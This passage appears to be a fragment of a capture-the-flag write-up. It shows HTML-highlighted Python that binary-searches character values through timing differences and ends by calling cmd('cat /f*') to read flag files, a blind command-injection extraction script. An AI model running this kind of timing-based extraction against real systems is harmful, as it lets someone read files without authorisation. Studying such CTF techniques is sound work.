class="hljs-keyword">left</span>+<span class="hljs-keyword">right</span>)//<span class="hljs-number">2</span>, end-start)<br>            <br>            <span class="hljs-keyword">if</span> end - start &gt; <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">right</span> = (<span class="hljs-keyword">left</span>+<span class="hljs-keyword">right</span>)//<span class="hljs-number">2</span>-<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">left</span> = (<span class="hljs-keyword">left</span>+<span class="hljs-keyword">right</span>)//<span class="hljs-number">2</span>+<span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">left</span> &gt; <span class="hljs-keyword">right</span>:<br>                # <span class="hljs-keyword">print</span>(chr(<span class="hljs-keyword">left</span>-<span class="hljs-number">1</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br>                result += chr(<span class="hljs-keyword">left</span>-<span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">print</span>(result)<br>                <span class="hljs-keyword">break</span><br><br><br>cmd(<span class="hljs-string">&#x27;cat /f*&#x27;</span>)<br></code></pre></td></tr></table></figure>
 
 
 
